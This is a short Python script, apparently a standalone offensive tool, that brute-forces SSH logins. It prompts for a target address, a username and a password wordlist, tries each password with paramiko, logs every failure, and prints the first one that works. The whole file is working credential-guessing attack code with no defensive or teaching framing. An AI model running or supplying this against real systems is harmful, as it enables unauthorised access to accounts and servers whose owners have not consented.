#!/usr/bin/env python3
import paramiko, os, termcolor, sys, socket

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)

    except paramiko.AuthenticationException:
        code = 1

    except socket.error as e:
        code = 2

    ssh.close()
    return code

host = input('[+] Enter the targeted address: ')
username = input('[+] Enter the user name: ')
input_file = input("[+] Enter the path of the file: ")

# check if file is present

if os.path.exists(input_file) == False:
    print('[!!] File doesnt exist in directory/path')
    sys.exit(1)

    
with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found password!! ' + password + ', for account: '+ username), 'green'))
                break
            elif response == 1:
                print('[-] incorrect login: '+ password)
            elif response == 2:
                print('[!!] Cant connect')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
